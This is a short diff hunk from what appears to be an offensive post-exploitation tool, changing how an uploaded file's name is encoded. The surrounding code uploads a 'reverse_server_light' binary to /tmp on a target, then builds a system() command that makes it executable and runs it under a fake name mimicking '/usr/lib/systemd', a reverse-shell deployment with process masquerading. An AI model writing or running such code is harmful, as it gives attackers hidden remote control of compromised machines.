@@ -54,7 +54,7 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
         print(color.yellow(f"Use Mode 2->linux script command"))
     else:
         print(color.yellow(f"Use Mode 3->upload"))
-        filename = encrypt(f"{lhost}-{port}".encode()).decode()
+        filename = encrypt(f"{lhost}-{port}")
         if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/%s" % filename, True):
             return
         command = f"system('cd /tmp && chmod +x {filename} && ./{filename} {fakename}');"
